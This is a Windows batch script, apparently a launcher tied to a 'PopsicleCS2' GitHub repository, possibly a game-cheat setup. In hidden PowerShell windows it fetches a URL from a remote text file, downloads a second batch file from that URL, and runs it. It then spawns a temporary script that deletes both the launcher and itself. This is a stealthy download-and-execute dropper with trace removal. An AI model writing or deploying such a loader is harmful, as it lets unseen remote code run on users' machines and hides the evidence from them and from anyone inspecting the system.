@echo off
setlocal

set "LINK_URL=https://raw.githubusercontent.com/popsiclez/PopsicleCS2/refs/heads/main/setuplink"
set "LINK_FILE=%temp%\setuplink.txt"
set "OUT=%~dp0setup.bat"
set "LAUNCHER=%~f0"


powershell -NoProfile -WindowStyle Hidden -Command ^
  "try{ (New-Object System.Net.WebClient).DownloadFile('%LINK_URL%','%LINK_FILE%'); exit 0 } catch { exit 1 }" >nul 2>&1
if errorlevel 1 exit /b 1


set /p URL=<"%LINK_FILE%"
del "%LINK_FILE%" >nul 2>&1


powershell -NoProfile -WindowStyle Hidden -Command ^
  "try{ (New-Object System.Net.WebClient).DownloadFile('%URL%','%OUT%'); exit 0 } catch { exit 1 }" >nul 2>&1
if errorlevel 1 exit /b 1


start "" cmd /c "%OUT%"


set "DELETER=%temp%\del_self_%random%.bat"
(
  echo @echo off
  echo ping -n 4 127.0.0.1 ^>nul 2^>^&1
  echo del /f /q "%LAUNCHER%" ^>nul 2^>^&1
  echo del /f /q "%%~f0" ^>nul 2^>^&1
) > "%DELETER%"


start "" /min cmd /c "%DELETER%"

endlocal
exit /b 0
